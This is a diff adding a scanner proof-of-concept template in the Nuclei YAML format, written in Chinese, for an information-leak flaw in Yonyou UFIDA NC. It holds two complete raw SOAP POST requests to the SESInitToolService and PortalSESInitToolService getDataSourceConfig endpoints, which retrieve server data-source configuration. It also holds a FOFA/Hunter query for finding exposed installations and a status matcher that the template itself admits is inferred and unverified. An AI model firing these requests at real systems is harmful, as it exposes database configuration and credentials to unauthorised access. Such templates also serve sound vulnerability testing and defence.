@@ -1,0 +1,28 @@
+id: poc-0b6100fdf22e902c9c16
+info:
+  name: 用友UFIDANCgetDataSourceConfig存在信息泄露漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0b6100fdf22e902c9c16224949b07e7f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 0b6100fdf22e902c9c16224949b07e7f
+    fofa: + hunter`app.name="用友 UFIDA NC"`
+http:
+- raw:
+  - "POST /uapws/service/nc.itf.ses.inittool.SESInitToolService HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID=57CC01E2D28AFE5F2A476BFF030D601A.ncServer; JSESSIONID=95BB77917927DCB24E2A01BDD1AB6CC1.ncServer\nUpgrade-Insecure-Requests: 1\nSOAPAction: urn:getDataSourceConfig\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 245\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ses=\"http://inittool.ses.itf.nc/SESInitToolService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ses:getDataSourceConfig/>\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID=A957970D435ACE12928741F2456B7644.ncServer; JSESSIONID=95BB77917927DCB24E2A01BDD1AB6CC1.ncServer\nUpgrade-Insecure-Requests: 1\nSOAPAction: urn:getDataSourceConfig\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 251\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:por=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <por:getDataSourceConfig/>\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
